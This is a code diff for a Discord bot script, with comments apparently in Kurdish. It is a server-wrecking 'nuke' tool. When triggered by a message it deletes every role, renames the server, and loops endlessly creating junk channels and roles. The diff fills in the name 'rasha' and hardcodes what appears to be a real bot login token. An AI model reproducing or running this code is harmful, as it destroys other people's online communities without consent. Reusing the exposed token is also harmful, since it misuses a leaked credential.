@@ -15,14 +15,14 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("");////nawek dane bo sar server 
+      message.guild.setName("rasha");////nawek dane bo sar server 
       setInterval(function() {
-        message.guild.createChannel("", "voice");///////bo channel 
-        message.guild.createChannel("", "text");////bo voice
-        message.guild.createRole({ name: "" });////nawek dane bo role kan
+        message.guild.createChannel("", "rasha");///////bo channel 
+        message.guild.createChannel("", "rasha");////bo voice
+        message.guild.createRole({ name: "rasha" });////nawek dane bo role kan
       });
     }
   }
 });
 
-client.login("");
+client.login("MTAxNTU3NzUwMDgzNjk2MjMzNA.GRkbgA.s0i48vfZW7uMSOJz2RokZdz6MhwG3onPAyQfeI");
